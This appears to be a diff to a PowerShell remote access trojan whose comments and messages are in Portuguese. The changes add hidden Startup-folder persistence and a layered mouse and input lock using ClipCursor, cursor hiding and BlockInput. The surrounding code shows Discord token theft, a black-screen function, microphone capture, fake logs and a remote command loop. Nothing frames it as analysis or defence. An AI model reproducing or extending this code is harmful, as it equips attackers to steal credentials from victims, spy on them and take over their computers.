@@ -40,10 +40,7 @@ function Remove-UserFromRAT {
     param([string]$UserName)
     try {
         $removido = $false
-        if (Test-Path $registryPath) { 
-            Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue
-            $removido = $true 
-        }
+        if (Test-Path $registryPath) { Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue; $removido = $true }
         if (Test-Path $userListFile) { 
             $users = Get-Content $userListFile -ErrorAction SilentlyContinue
             $users = $users | Where-Object { $_ -ne $UserName }
@@ -55,12 +52,8 @@ function Remove-UserFromRAT {
             Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
             $removido = $true
         }
-        if ($removido) { 
-            return "USUARIO_REMOVIDO" 
-        } else { 
-            return "USUARIO_NAO_ENCONTRADO" 
-        }
-    } catch {
+        if ($removido) { return "USUARIO_REMOVIDO" } else { return "USUARIO_NAO_ENCONTRADO" }
+    } catch { 
         Write-DebugLog "Erro em Remove-UserFromRAT: $_"
         return "ERRO_AO_REMOVER" 
     }
@@ -69,14 +62,10 @@ function Remove-UserFromRAT {
 function Get-RATUsers {
     try {
         $users = @()
-        if (Test-Path $userListFile) { 
-            $users = Get-Content $userListFile -ErrorAction SilentlyContinue 
-        }
-        if ($users.Count -eq 0) { 
-            return "Nenhum usuário encontrado" 
-        }
+        if (Test-Path $userListFile) { $users = Get-Content $userListFile -ErrorAction SilentlyContinue }
+        if ($users.Count -eq 0) { return "Nenhum usuário encontrado" }
         return "USUARIOS:" + ($users -join "`n")
-    } catch {
+    } catch { 
         Write-DebugLog "Erro em Get-RATUsers: $_"
         return "ERRO_AO_LISTAR" 
     }
@@ -91,7 +80,7 @@ function Add-UserToList {
         Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
         Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
         return $true
-    } catch {
+    } catch { 
         Write-DebugLog "Erro em Add-UserToList: $_"
         return $false 
     }
@@ -99,21 +88,11 @@ function Add-UserToList {
 
 $currentUser = "$env:COMPUTERNAME@$env:USERNAME"
 $userExecuted = $false
-
-try {
-    if (Test-Path $userListFile) {
-        $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-        if ($users -contains $currentUser) { 
-            $userExecuted = $true 
-        }
-    }
-} catch {
-    Write-DebugLog "Erro ao verificar usuário: $_"
+if (Test-Path $userListFile) {
+    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
+    if ($users -contains $currentUser) { $userExecuted = $true }
 }
-
-if (-not $userExecuted) { 
-    Add-UserToList $currentUser 
-}
+if (-not $userExecuted) { Add-UserToList $currentUser }
 
 # ===== LOGS FAKES =====
 Write-Host ""
@@ -164,6 +143,19 @@ function Install-Persistence {
             Write-DebugLog "Persistência adicionada como tarefa agendada"
         } catch {
             Write-DebugLog "Erro ao criar tarefa agendada: $_"
+        }
+        
+        try {
+            $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+            $shortcutPath = "$startupPath\$installName.lnk"
+            $WScriptShell = New-Object -ComObject WScript.Shell
+            $shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+            $shortcut.TargetPath = "powershell.exe"
+            $shortcut.Arguments = "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
+            $shortcut.Save()
+            Write-DebugLog "Atalho adicionado à pasta de inicialização"
+        } catch {
+            Write-DebugLog "Erro ao criar atalho: $_"
         }
         
         attrib +h +s +r $scriptPath
@@ -322,9 +314,7 @@ function Get-DiscordToken {
             }
         }
         $tokens = $tokens | Select-Object -Unique
-        if ($tokens.Count -eq 0) { 
-            return "TOKENS:Nenhum token encontrado" 
-        }
+        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
         Write-DebugLog "Tokens encontrados: $($tokens.Count)"
         return "TOKENS:" + ($tokens -join "`n")
     } catch {
@@ -464,6 +454,8 @@ function Unlock-Drives {
 }
 
 # ===== TELA PRETA =====
+$global:blackScreenForm = $null
+
 function Black-Screen {
     try {
         $ps = [powershell]::Create()
@@ -504,9 +496,11 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (VERSÃO SIMPLES E ROBUSTA) =====
+# ===== TRAVAR MOUSE (VERSÃO CORRIGIDA - TODAS AS CAMADAS) =====
 $script:mouseLocked = $false
 $script:lockThread = $null
+$script:reinforceThread = $null
+$script:clipCursorSuccess = $false
 
 function Lock-Mouse {
     try {
@@ -518,7 +512,7 @@ function Lock-Mouse {
         
         $script:mouseLocked = $true
         
-        # Tenta ClipCursor (API nativa)
+        # CAMADA 1: ClipCursor (API nativa)
         try {
             $cSharpCode = @'
 using System;
@@ -527,6 +521,12 @@ using System.Windows.Forms;
 public class MouseLocker {
     [DllImport("user32.dll")]
     public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [DllImport("user32.dll")]
+    public static extern bool SetCursorPos(int x, int y);
+    
+    [DllImport("user32.dll")]
+    public static extern int ShowCursor(bool bShow);
     
     [StructLayout(LayoutKind.Sequential)]
     public struct RECT {
@@ -540,6 +540,8 @@ public class MouseLocker {
         rect.right = 1;
         rect.bottom = 1;
         ClipCursor(ref rect);
+        SetCursorPos(0, 0);
+        ShowCursor(false);
     }
     
     public static void Unlock() {
@@ -549,17 +551,21 @@ public class MouseLocker {
         rect.right = Screen.PrimaryScreen.Bounds.Width;
         rect.bottom = Screen.PrimaryScreen.Bounds.Height;
         ClipCursor(ref rect);
+        ShowCursor(true);
     }
 }
 '@
             Add-Type -TypeDefinition $cSharpCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
             [MouseLocker]::Lock()
-            Write-DebugLog "ClipCursor aplicado com sucesso"
+            $script:clipCursorSuccess = $true
+            Write-DebugLog "✓ ClipCursor aplicado com sucesso"
         } catch {
-            Write-DebugLog "Falha ao usar ClipCursor: $_"
+            Write-DebugLog "✗ Falha no ClipCursor: $_"
+            $script:clipCursorSuccess = $false
         }
         
-        # Thread de movimento constante (fallback)
+        # CAMADA 2: Thread de movimento constante
+        Write-DebugLog "CAMADA 2: Iniciando thread de movimento constante"
         $script:lockThread = [System.Threading.Thread]::new({
             while ($script:mouseLocked) {
                 try {
@@ -572,15 +578,58 @@ public class MouseLocker {
         })
         $script:lockThread.IsBackground = $true
         $script:lockThread.Start()
+        Write-DebugLog "✓ Thread de movimento iniciada"
         
-        Write-DebugLog "Thread de movimento iniciada"
+        # CAMADA 3: Reforço do ClipCursor
+        if ($script:clipCursorSuccess) {
+            Write-DebugLog "CAMADA 3: Iniciando thread de reforço do ClipCursor"
+            $script:reinforceThread = [System.Threading.Thread]::new({
+                while ($script:mouseLocked) {
+                    try {
+                        [MouseLocker]::Lock()
+                        Start-Sleep -Milliseconds 100
+                    } catch {
+                        # Ignora erros
+                    }
+                }
+            })
+            $script:reinforceThread.IsBackground = $true
+            $script:reinforceThread.Start()
+            Write-DebugLog "✓ Thread de reforço iniciada"
+        }
+        
+        # CAMADA 4: Bloqueio de eventos
+        try {
+            $blockInputCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class InputBlocker {
+    [DllImport("user32.dll")]
+    public static extern bool BlockInput(bool fBlockIt);
+    
+    public static void Block() {
+        BlockInput(true);
+    }
+    
+    public static void Unblock() {
+        BlockInput(false);
+    }
+}
+'@
+            Add-Type -TypeDefinition $blockInputCode -ErrorAction SilentlyContinue
+            [InputBlocker]::Block()
+            Write-DebugLog "✓ Bloqueio de eventos aplicado"
+        } catch {
+            Write-DebugLog "✗ Falha no bloqueio de eventos: $_"
+        }
+        
         Write-DebugLog "=" * 60
         Write-DebugLog "TRAVAMENTO DO MOUSE CONCLUÍDO"
         Write-DebugLog "=" * 60
         
         return "MOUSE_LOCKED"
     } catch {
-        Write-DebugLog "Erro ao travar mouse: $_"
+        Write-DebugLog "❌ ERRO CRÍTICO em Lock-Mouse: $_"
         return "MOUSE_LOCK_ERROR"
     }
 }
@@ -593,18 +642,43 @@ function Unlock-Mouse {
         
         $script:mouseLocked = $false
         
-        # Tenta liberar via ClipCursor
-        try {
-            [MouseLocker]::Unlock()
-            Write-DebugLog "ClipCursor liberado"
-        } catch {
-            Write-DebugLog "Falha ao liberar ClipCursor: $_"
+        # Libera ClipCursor
+        if ($script:clipCursorSuccess) {
+            try {
+                [MouseLocker]::Unlock()
+                Write-DebugLog "✓ ClipCursor liberado"
+            } catch {
+                Write-DebugLog "✗ Erro ao liberar ClipCursor: $_"
+            }
         }
         
-        # Para a thread
+        # Libera bloqueio de eventos
+        try {
+            [InputBlocker]::Unblock()
+            Write-DebugLog "✓ Bloqueio de eventos liberado"
+        } catch {
+            Write-DebugLog "✗ Erro ao liberar bloqueio de eventos: $_"
+        }
+        
+        # Para threads
         if ($script:lockThread -and $script:lockThread.IsAlive) {
             $script:lockThread.Abort()
-            Write-DebugLog "Thread de movimento abortada"
+            Write-DebugLog "✓ Thread de movimento abortada"
+        }
+        
+        if ($script:reinforceThread -and $script:reinforceThread.IsAlive) {
+            $script:reinforceThread.Abort()
+            Write-DebugLog "✓ Thread de reforço abortada"
+        }
+        
+        # Força liberação
+        try {
+            Add-Type -AssemblyName System.Windows.Forms
+            [System.Windows.Forms.Cursor]::Clip = New-Object System.Drawing.Rectangle(0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
+            [System.Windows.Forms.Cursor]::Show()
+            Write-DebugLog "✓ Cursor liberado via Cursor.Clip"
+        } catch {
+            Write-DebugLog "✗ Erro ao forçar liberação: $_"
         }
         
         Write-DebugLog "=" * 60
@@ -613,7 +687,7 @@ function Unlock-Mouse {
         
         return "MOUSE_UNLOCKED"
     } catch {
-        Write-DebugLog "Erro ao liberar mouse: $_"
+        Write-DebugLog "❌ ERRO CRÍTICO em Unlock-Mouse: $_"
         return "MOUSE_UNLOCK_ERROR"
     }
 }
@@ -749,9 +823,11 @@ while ($true) {
                 $writer.WriteLine((Unlock-Screen))
             } elseif ($cmd -eq "lock_mouse") {
                 $result = Lock-Mouse
+                Write-DebugLog "Resultado lock_mouse: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "unlock_mouse") {
                 $result = Unlock-Mouse
+                Write-DebugLog "Resultado unlock_mouse: $result"
                 $writer.WriteLine($result)
             } elseif ($cmd -eq "mic") {
                 $writer.WriteLine((Get-Microphone))
